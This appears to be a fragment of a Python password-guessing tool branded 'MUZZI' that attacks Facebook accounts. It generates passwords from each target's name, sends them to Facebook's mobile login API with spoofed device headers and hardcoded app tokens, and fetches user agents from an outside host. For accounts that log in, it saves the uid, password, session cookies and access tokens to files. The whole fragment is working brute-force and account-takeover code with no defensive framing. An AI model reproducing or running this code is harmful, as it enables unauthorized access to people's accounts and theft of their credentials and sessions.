			sys.stdout.write('\r [MUZZI] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			m4url = "https://iquaqib.vercel.app/ua"
			m4ua = requests.get(m4url).text
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "register_api",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_PK",
"client_country_code": "PK",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': m4ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': f'{SEX}',
'Authorization':'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895',
'X-FB-Connection-Quality':f'{SEX}',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#rint(q)
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[MUZZI-OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/MUZZI_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/MUZZI_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;91m[MUZZI-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/MUZZI_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
	
	
if __name__=="__main__":
	#anary_detect()
	MUZZI().MUZZI()
	#MUZZI().method2('100093614310527','Right123',['55556666'])
Footer
